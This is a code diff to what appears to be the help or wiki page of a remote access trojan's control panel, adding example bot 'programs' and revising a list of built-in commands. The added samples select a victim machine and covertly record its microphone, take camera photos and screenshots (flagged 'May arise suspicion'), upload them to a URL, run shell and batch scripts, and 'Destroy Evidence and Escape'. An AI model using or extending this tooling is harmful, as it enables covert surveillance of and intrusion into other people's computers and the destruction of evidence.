@@ -31,6 +31,7 @@ const typer = (x) => {
  }
 };
 
+// Wiki Section
 const shakeSpeare = (x, y) => {
  document.getElementById("fne").textContent = "Program-" + x + ".fdm";
  let tale;
@@ -132,12 +133,25 @@ const shakeSpeare = (x, y) => {
    tale = `// |==============================================|\n// |  Program-${x}\n// |  Description: Downloads a file onto target.\n// |______________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'\nPC.Download("https://www..."); // URL of Remote File.\n\n`;
    break;
   case 33:
-   tale = "// |==============================================|\n// |  Program-${x}\n// |  Description: Return a Screenshot from a specific system.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
+   tale = `// |==============================================|\n// |  Program-${x}\n// |  Description: Capture Audio from target.\n// |______________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'\nPC.Mic("https://www...",1); // File Upload URL and Record for 1 min.\n\n`;
    break;
   case 34:
-   tale = "// |==============================================|\n// |  Program-${x}\n// |  Description: Run VB Script & escape from a specific host.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
+   tale = `// |==============================================|\n// |  Program-${x}\n// |  Description: Return list of active applications.\n// |______________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'\nPC.Log();\n\n`;
+   break;
+  case 35:
+   tale = `// |==============================================|\n// |  Program-${x}\n// |  Description: Captures a Photo.\n// |  Warning: May arise suspicion.\n// |______________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'\nPC.Camera("https://www..."); // File Upload URL.\n\n`;
+   break;
+  case 36:
+   tale = `// |==============================================|\n// |  Program-${x}\n// |  Description: Take a Screenshot.\n// |  Warning: May arise suspicion.\n// |______________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'\nPC.Screenshot("https://www..."); // File Upload URL.\n\n`;
+   break;
+  case 37:
+   tale = `// |==============================================|\n// |  Program-${x}\n// |  Description: Timed Execution.\n// |______________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'\nPC.ExecuteAt("14:59");\nPC.Info("Wake wakey..");\n\n`;
+   break;
+  case 38:
+   tale = `// |==============================================|\n// |  Program-${x}\n// |  Description: Execute and Escape.\n// |  Warning: This action is irreversible.\n// |______________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'\nPC.Excape("echo Good bye...");\n\n`;
    break;
   default:
+   alert("Wiki not found!");
    break;
  }
  let s = 0;
@@ -192,47 +206,44 @@ Last Updated : 19 Februvary 2021
 
  LIST OF BUILT-IN FUNCTIONS
 ----------------------------------------------------
-
 1) Excape(x) - Execute Batch script and Escape()
-2)  ✔️ Escape() - Destroy Evidence and Escape
-3)  ✔️ Marco() - Returns Polo if Online
-4)  ✔️ Exit() - End Execution
-5)  ✔️ Update(x) - Updates self
-6)  ✔️ Hibernate(x) -  till date
-7)  ✔️ Revive() - End Hibernation  
-8)  Notify() - Notifies power schedule
-9)  ✔️ Rename(x) - Renames RAT
-10) ✔️ Flash() - Flashes Screen, Visual Indication
-11) ✔️ Vbs(x) - Runs .VBS Script
-12) ✔️ Bat(x) - Runs .Bat Script
-13) ✔️ Shell(x) - Runs Shell Commands
-14) ✔️ Speak(x) - Text to Speech
-15) ✔️ Play(x) - Play a Remote (mp3) Audio File (URL)
-16) Mic(x) - Records audio for 'x' ms
-17) ✔️ Lock(x) - Select Target
-18) ✔️ Info(x) - Shows Info box
-19) ✔️ Warn(x) - Shows Warning Box
-20) ✔️ Error(x) - Shows Error box
-21) ✔️ Timebox(x,y) - Shows Msg Box fo 'y' ms
-22) ✔️ Google(x) - Googles selected Text
-23) ✔️ Web(x) - Navigates to 'x' url
-24) ✔️ Type(x) - Types custom text
-25) Screenshot(x) - Takes a Screenshot
-26) Camera(x) - Captures a Photo
-27) ✔️ Details() - Retrieves PC Info
-28) ✔️ Tree(x) - Retrieves Directory / Folder structures
-29) ✔️ Send(x) - Sends a File
-30) Zip(x) - Zip a folder
-31) Unzip(x) - Unzips file
-32) ✔️ Health(x) - Reports back a RAT's working conditions.
-33) Log(x) - Logs every Activity
-34) ✔️ Delay(x) - Pause Execution temporarily for 'x' ms
-35) ✔️ Shutdown(x) - Shutsdown the system after 'x' ms"
-36) ✔️ Clone() - Initiate Clone Operations
-37) ✔️ NClone() - Stops Cloning Operations
-38) ✔️ Prompt(x) - Prompts user for an input.
-39) ✔️ Disk() - Retrieves Disk Info
-40) ✔️ Download() - Downloads a file onto target.
+2) Escape() - Destroy Evidence and Escape
+3) Marco() - Returns Polo if Online
+4) Exit() - End Execution
+5) Update(x) - Updates self
+6) Hibernate(x) -  till date
+7) Revive() - End Hibernation  
+8) Rename(x) - Renames RAT
+9) Flash() - Flashes Screen, Visual Indication
+10) Vbs(x) - Runs .VBS Script
+11) Bat(x) - Runs .Bat Script
+12) Shell(x) - Runs Shell Commands
+13) Speak(x) - Text to Speech
+14) Play(x) - Play a Remote (mp3) Audio File (URL)
+15) Mic(x) - Records audio for 'x' ms
+16) Lock(x) - Select Target
+17) Info(x) - Shows Info box
+18) Warn(x) - Shows Warning Box
+19) Error(x) - Shows Error box
+20) Timebox(x,y) - Shows Msg Box fo 'y' ms
+21) Google(x) - Googles selected Text
+22) Web(x) - Navigates to 'x' url
+23) Type(x) - Types custom text
+24) Screenshot(x) - Takes a Screenshot
+25) Camera(x) - Captures a Photo
+26) Details() - Retrieves PC Info
+27) Tree(x) - Retrieves Directory / Folder structures
+28) Send(x) - Sends a File
+29) Health(x) - Reports back a RAT's working conditions.
+30) Log() - Return list of active applications.
+31) Delay(x) - Pause Execution temporarily for 'x' ms
+32) Shutdown(x) - Shutsdown the system after 'x' ms"
+33) Clone() - Initiate Clone Operations
+34) NClone() - Stops Cloning Operations
+35) Prompt(x) - Prompts user for an input.
+36) Disk() - Retrieves Disk Info
+37) Download() - Downloads a file onto target.
+37) ExecuteAt(x) - Executes script at specified time.
 
 Eg: PC.Lock("A01");
 
